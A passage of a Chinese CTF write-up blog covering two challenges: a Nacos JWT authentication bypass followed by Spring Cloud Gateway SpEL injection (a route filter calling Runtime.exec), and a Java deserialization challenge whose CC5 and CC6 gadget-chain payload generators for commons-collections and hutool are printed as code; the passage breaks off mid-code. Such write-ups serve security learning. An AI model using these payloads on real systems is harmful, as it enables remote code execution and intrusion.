class="language-pgsql"><span class="comment">--AaB03x--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure>



<h1 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h1><p>靶机环境为NACOS，查找相关漏洞</p>
<blockquote>
<p>Nacos（Dynamic Naming and Configuration Service）是一个开源的、易于使用的平台，为微服务架构提供了服务发现、服务配置以及服务管理功能。</p>
</blockquote>
<p>找到一个身份认证漏洞，伪造JWT获取token，然后登录即可达到后台</p>
<blockquote>
<p>这里要注意需要拦截登录后的第一个响应，然后Drop掉，否则会跳转到json页面，导致无法进入后台</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU2MzY1NjU3Ng==&mid=2247485077&idx=1&sn=c9f0600400b44822ab26a55412f3d4b3&chksm=fc57a47acb202d6c42c5789af9f99e82c9a795f0f5da22aa561419d336a0a169f14fd6d4b851&scene=126&sessionid=1679659758&key=67b57c8e46f5d1d80c2bb9519c7d74d16cc231641e6dd80f4e4b954dee64cc2a5d73cb0875d853384d6a4c7c359804aa6f1004d55be0d4883c9bb5ae47daeb867a1a96bfea20047eb4e56a9fea9586821130e529321a445fba24b3786151267137c18d49fb82e41ecb6e57ee63b9238e2c14b2a855c721ac4db40dd3636a5054&ascene=0&uin=NTY2NTA4NjQ=&devicetype=Windows+10+x64&version=6309001c&lang=zh_CN&countrycode=AL&exportkey=n_ChQIAhIQZqFRak0+ok+VGAxQEBbQFRLfAQIE97dBBAEAAAAAAKEgF5xO7GQAAAAOpnltbLcz9gKNyK89dVj0+McURInU5fitAeFmyI82mXQsUmaDB7mzukPjcXxQsbwc67WfJrcVhzy0kN57ErDJaPf7FSpzaJaQb7mTO/shIn1ZYM0pHPFzePlUrrhjNmCZoUa5rIB3fYVYr44JJCcjIg9LHFQbCKEnr5jyWrl2w0pUUSTVIyN8bFvRhgxvekRkiBuCi7VrMhIM36wWl85B4xaEZouVlJBmtLQI2X+nGSeU/1RsTLcAgUk+tyrGwlLF+sMC33v0xy8=&acctmode=0&pass_ticket=rDVx6Pa2XzsX0AcufBVzVRDTFmxP+XUFJ">Nacos 身份认证绕过漏洞QVD-2023-6271</a></p>
<p>找到了一个命令执行漏洞，但是尝试后无果。</p>
<p>又找到一篇利用SpringCloudGateway+Nacos进行RCE的文章</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11493">Nacos结合Spring Cloud Gateway RCE利用 - 先知社区</a></p>
<p>作者还贴心的附上了环境搭建步骤，所以我们要先搭建好环境</p>
<p>首先看附件里的<strong>bootstrap.yml</strong></p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">backcfg</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yaml</span></span><br><span class="line">        <span class="attr">group:</span> <span class="string">DEFAULT_GROUP</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里的配置文件貌似给错了，因为wp里是json，端口是8888</p>
</blockquote>
<p>对应的作用如下</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td><code>spring.cloud.nacos.config.name</code></td>
<td>Nacos配置的Data ID。它标识了配置的名称为<code>backcfg</code>。</td>
</tr>
<tr>
<td><code>spring.cloud.nacos.config.file-extension</code></td>
<td>指定Nacos配置的文件格式。在这里，文件格式被设定为<code>yaml</code>。</td>
</tr>
<tr>
<td><code>spring.cloud.nacos.config.group</code></td>
<td>Nacos配置的组名。此处的组名被设定为<code>DEFAULT_GROUP</code>。</td>
</tr>
<tr>
<td><code>spring.cloud.nacos.config.server-addr</code></td>
<td>Nacos服务的地址和端口。此处意味着Nacos运行在本地<code>127.0.0.1</code>地址的<code>8848</code>端口上。</td>
</tr>
<tr>
<td><code>spring.cloud.nacos.discovery.server-addr</code></td>
<td>Nacos服务发现功能的地址和端口。它也指向运行在<code>127.0.0.1</code>地址的<code>8848</code>端口的Nacos服务。</td>
</tr>
</tbody></table>
<p>在这种情况下，Spring Cloud Gateway会去Nacos配置中心寻找一个名为<code>backcfg</code>的配置项，而这个配置项的格式是<code>yaml</code>。因此，Nacos要提供一个名为<code>backcfg.yaml</code>的文件内容给Spring Cloud Gateway。</p>
<p>所以我们需要先去<code>配置管理</code>-&gt;<code>配置列表</code>下增加一个新的配置文件，格式选为yaml，名称设置为backcfg。上传内容就是application.yaml中的内容</p>
<img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20231014_1.png" style="zoom:67%;" />



<p>如果成功了，在监听查询中就会出现使用该配置的host信息</p>
<p>该yaml中的每个属性对应的作用如下：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td><code>spring.main.web-application-type</code></td>
<td>设置Spring Boot应用的类型为响应式。常用于WebFlux框架。</td>
</tr>
<tr>
<td><code>spring.application.name</code></td>
<td>定义应用的名称，此处为<code>backendservice</code>。</td>
</tr>
<tr>
<td><code>server.port</code></td>
<td>定义Spring Boot应用监听的端口，此处为<code>18888</code>。</td>
</tr>
<tr>
<td><code>management.endpoint.gateway.enabled</code></td>
<td>启用或禁用gateway端点，默认为<code>true</code>。用于获取网关的路由信息。</td>
</tr>
<tr>
<td><code>management.endpoints.web.exposure.include</code></td>
<td>指定哪些端点可以被暴露，此处只暴露了<code>gateway</code>端点。</td>
</tr>
<tr>
<td><code>management.endpoints.web.exposure.include</code> (下面的)</td>
<td>指定哪些端点可以被暴露，此处使用<code>*</code>，表示暴露所有端点。</td>
</tr>
<tr>
<td><code>spring.main.allow-bean-definition-overriding</code></td>
<td>是否允许覆盖bean定义。当有多个bean定义时，此属性允许一个bean定义覆盖另一个。默认为<code>false</code>。</td>
</tr>
<tr>
<td><code>spring.cloud.gateway.routes</code></td>
<td>定义Spring Cloud Gateway的路由信息。</td>
</tr>
<tr>
<td><code>spring.cloud.gateway.routes.id</code></td>
<td>每个路由的唯一标识，此处为<code>index</code>。</td>
</tr>
<tr>
<td><code>spring.cloud.gateway.routes.uri</code></td>
<td>指定路由目标的URI。当请求匹配某个路由时，它会被转发到这个URI。此处为<code>http://example.com</code>。</td>
</tr>
<tr>
<td><code>spring.cloud.gateway.routes.predicates</code></td>
<td>路由断言定义。决定哪些请求可以被路由。在这里，任何请求路径为<code>/example</code>的请求都会匹配到这个路由。</td>
</tr>
</tbody></table>
<p>但这道题的环境原因导致spring gateway我们无法访问，所以通过添加路由来访问的上述方法无法利用。</p>
<p>顺着文章再往下看，发现可以利用</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">exam</span></span><br><span class="line">          <span class="attr">order:</span> <span class="number">0</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://backendservice</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/echo/**</span></span><br><span class="line">          <span class="attr">filters:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">AddResponseHeader</span></span><br><span class="line">              <span class="attr">args:</span></span><br><span class="line">                <span class="attr">name:</span> <span class="string">result</span></span><br><span class="line">                <span class="attr">value:</span> <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>但是不知道为什么，wp里说是json格式，并且其他师傅的配置文件中是指明json，但我的靶机里就是yaml。。。</p>
<p>还有个坑点就是既然我们无法直接访问gateway来知道结果的话，一般来说就会用curl来判断是否成功rce，但这道题的靶机没有安装curl，所以我一直以为是哪里搞错了。。</p>
<p><img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20231014_2.png"></p>
<p>这道题做完后其实感觉并不难，但是毕竟没有接触过微服务的人一开始做的话很难理解。所以我尽量去理解了spring gateway和nacos的原理，配置选项，以及他们如何实现联动的，感觉和JNDI的中心化管理思想很类似，还算是有点收获</p>
<h1 id="deserbug"><a href="#deserbug" class="headerlink" title="deserbug"></a>deserbug</h1><p>题目给出了<code>commons-collections-3.2.2.jar</code>，因为大于3.1版本，也不是4.0版本，所以不能直接使用经典的CC链，比如在<strong>InvokerTransformer</strong>类中的readObject加了一行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == <span class="literal">null</span> ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>)) : class$org$apache$commons$collections$functors$InvokerTransformer);</span><br></pre></td></tr></table></figure>

<p>其中，checkUnsafeSerialization方法会尝试获取系统变量enableUnsafeSerialization的值</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.getProperty(<span class="string">&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>如果获取不到或者该系统变量不为true，则抛出异常<code>UnsupportedOperationException</code></p>
<p>题目hint为：<strong>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</strong></p>
<p>原本以为是要在<code>JSONObject.put</code>执行时通过添加重复key来抛出异常</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;Duplicate key \&quot;&#123;&#125;\&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;key&#125;);</span><br></pre></td></tr></table></figure>

<p>然后通过捕获这个异常来进行利用，但我发现首先<code>checkDuplicate</code>这个值无法控制，并且在put中为false，所以无法抛出该异常，除此之外，即使捕获到了JSONException也无法进行后续利用</p>
<p>看了<strong>小绿草实验室</strong>的WP，从JSONObject的put方法开始，一步一步调试到某个类执行getter方法，通过getter方法触发getAnyexcept,也就是说，这个<code>hint</code>结合源码具有一定的迷惑性，会引导人的想法到通过触发异常来<code>gadget</code></p>
<p><strong>WP中使用的gadget</strong>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap-&gt;readObject()-&gt;hash()-&gt;TiedMapEntry()-&gt;hashCode()-&gt;getValue()-&gt;LazyMap()-&gt;get()-&gt;ConstantTransformer-&gt;transform()-&gt;JSONObject-&gt;put()-&gt;TrAXFilter-&gt;newTransformer()-&gt;getTransletInstance()-&gt;Evil.class.newInstance()</span><br><span class="line">//当然，不止一个gadget，在后续会说到</span><br></pre></td></tr></table></figure>

<p>这里就是经验的差距体现出来了，如果不熟练那几条CC链，这个gatget是凑不起来的，就比如hint提示要用JSONObject.put和getAnyexcept，我们肯定知道最终利用的是getAnyexcept来加载恶意类，类比fastjson，就要想到hutool的json也可能有类似getter和setter的机制(<code>事后诸葛亮一下:)</code> )</p>
<p>本题目要调用的getter如下：</p>
<p><img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20231019_1.png" alt="getter调用"></p>
<p>而如何能找到能够调用Myexpect的getter，WP上说是一步步调试的，但这个调试也得需要点技巧。原因在于wrap方法:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">wrap</span><span class="params">(Object object, JSONConfig jsonConfig)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (object == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> jsonConfig.isIgnoreNullValue() ? <span class="literal">null</span> : JSONNull.NULL;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(object <span class="keyword">instanceof</span> JSON) &amp;&amp; !ObjectUtil.isNull(object) &amp;&amp; !(object <span class="keyword">instanceof</span> JSONString) &amp;&amp; !(object <span class="keyword">instanceof</span> CharSequence) &amp;&amp; !(object <span class="keyword">instanceof</span> Number) &amp;&amp; !ObjectUtil.isBasicType(object)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (object <span class="keyword">instanceof</span> SQLException) &#123;</span><br><span class="line">                <span class="keyword">return</span> object.toString();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(object <span class="keyword">instanceof</span> Iterable) &amp;&amp; !ArrayUtil.isArray(object)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(object <span class="keyword">instanceof</span> Map) &amp;&amp; !(object <span class="keyword">instanceof</span> Map.Entry)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(object <span class="keyword">instanceof</span> Date) &amp;&amp; !(object <span class="keyword">instanceof</span> Calendar) &amp;&amp; !(object <span class="keyword">instanceof</span> TemporalAccessor)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (object <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">                            <span class="keyword">return</span> object.toString();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> ClassUtil.isJdkClass(object.getClass()) ? object.toString() : <span class="keyword">new</span> <span class="title class_">JSONObject</span>(object, jsonConfig);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> object;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(object, jsonConfig);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>(object, jsonConfig);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> object <span class="keyword">instanceof</span> Number &amp;&amp; <span class="literal">null</span> != jsonConfig.getDateFormat() ? <span class="keyword">new</span> <span class="title class_">NumberWithFormat</span>((Number)object, jsonConfig.getDateFormat()) : object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从这个方法中可以提取出<code>isIgnoreNullValue()</code>，<code>toString()</code>,<code>JSONArray()</code>,<code>getDateFormat()</code>,<code>getClass()</code>,<code>JSONObject()</code>这几个方法，而这其中的一些方法还会嵌套其他方法，所以如果想挨个看的话很费精力。但我们可以初步淘汰几个，比如toString()，isIgnoreNullValue()这种稍微看一下就知道不能利用的。最后留下JSONObject()和JSONArray()，因为他们都会调用ObjectMapper.map()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//JSONArray.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">JSONArray</span><span class="params">(Object object, JSONConfig jsonConfig, Filter&lt;Mutable&lt;Object&gt;&gt; filter)</span> <span class="keyword">throws</span> JSONException &#123;</span><br><span class="line">        <span class="built_in">this</span>(<span class="number">10</span>, jsonConfig);</span><br><span class="line">        ObjectMapper.of(object).map(<span class="built_in">this</span>, filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//JSONObject.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">JSONObject</span><span class="params">(Object source, JSONConfig config, Filter&lt;MutablePair&lt;String, Object&gt;&gt; filter)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(<span class="number">16</span>, config);</span><br><span class="line">    ObjectMapper.of(source).map(<span class="built_in">this</span>, filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>现在我们知道，既然hint提示需要调用JSONObject的put，而该类并没有readObject方法，故而需要找到一个能够调用任意类的put方法的链子作为gadget的一部分，而JSONObject正好也属于Map的实现类，从常用的反序列化类中，符合条件的就是<code>LazyMap.get()</code></p>
<img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20231019_2.png" style="zoom:67%;" />

<blockquote>
<p>所以常见反序列化利用类需要很熟悉，否则很难想到这块</p>
</blockquote>
<p>通过transform间接地实现控制value，并且key也是任意类型，但是在warp方法中，只传进了此方法中的value，再结合hint要利用Myexpect类的方法，猜测要将value赋值为Myexpect对象<code>(这里可能有点牵强，但我也想不出其他更好的解释)</code>。那么在上述的wrap方法中，如果传入的object是一个自定义的类，那么最终调用的就只能是<code>new JSONObject(object, jsonConfig);</code>，后续就会从ObjectMapper.class-&gt;map()-&gt;mapFromBean() -&gt;······-&gt;PropDesc.class-&gt;getValue()执行myExpect.getAnyexcept()</p>
<p>那么剩下的就是从LazyMap向前拼gadget，可供选择的gadget如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//CC5 Gadget Chain:</span></span><br><span class="line">BadAttributeValueExpException.readObject() --&gt;</span><br><span class="line">TiedMapEntry.toString() --&gt;</span><br><span class="line">LazyMap.get()</span><br><span class="line"></span><br><span class="line"><span class="comment">//CC6 Gadget Chain:</span></span><br><span class="line">java.util.HashSet.readObject() --&gt;</span><br><span class="line">java.util.HashMap.put() --&gt;</span><br><span class="line">java.util.HashMap.hash() --&gt;</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() --&gt;</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() --&gt;</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line"></span><br><span class="line"><span class="comment">//CC7 Gadget Chain:</span></span><br><span class="line">java.util.Hashtable.readObject --&gt;</span><br><span class="line">java.util.Hashtable.reconstitutionPut() --&gt;</span><br><span class="line">org.apache.commons.collections.map.AbstractMapDecorator.equals() --&gt;</span><br><span class="line">java.util.AbstractMap.equals() --&gt;</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get()</span><br></pre></td></tr></table></figure>



<h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">      ......</span><br><span class="line">      ......</span><br><span class="line">      <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">      <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">      <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Evil.class.getName());</span><br><span class="line">      Reflection.setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">      Reflection.setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]</span><br><span class="line">              &#123;clazz.toBytecode()&#125;);</span><br><span class="line">      Reflection.setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span></span><br><span class="line">              <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">      <span class="type">Myexpect</span> <span class="variable">expect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line">      expect.setTargetclass(TrAXFilter.class);</span><br><span class="line">      expect.setTypeparam(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;);</span><br><span class="line">      expect.setTypearg(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;);</span><br><span class="line">      <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> jsonObject;</span><br><span class="line">      <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line">      <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;k&quot;</span>);</span><br><span class="line">      <span class="comment">/*Map expMap = new HashMap();</span></span><br><span class="line"><span class="comment">      expMap.put(tme, &quot;valuevalue&quot;);*/</span></span><br><span class="line">      Reflection.setFieldValue(transformer, <span class="string">&quot;iConstant&quot;</span>, expect);</span><br><span class="line"><span class="comment">//CC5</span></span><br><span class="line">      <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">      <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">      valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      valfield.set(val, tme);</span><br><span class="line">      <span class="comment">//序列化</span></span><br><span class="line">      ByteArrayOutputStream byteArrayOutputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">      <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">      outputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">      System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));</span><br><span class="line">      ......</span><br><span class="line">      ......</span><br></pre></td></tr></table></figure>



<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">      ......</span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">      <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">      <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Evil.class.getName());</span><br><span class="line">      Reflection.setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">      Reflection.setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]</span><br><span class="line">              &#123;clazz.toBytecode()&#125;);</span><br><span class="line">      Reflection.setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span></span><br><span class="line">              <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">      <span class="type">Myexpect</span> <span class="variable">expect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line">      expect.setTargetclass(TrAXFilter.class);</span><br><span class="line">      expect.setTypeparam(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;);</span><br><span class="line">      expect.setTypearg(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;);</span><br><span class="line">      <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> jsonObject;</span><br><span class="line">      <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line">      <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 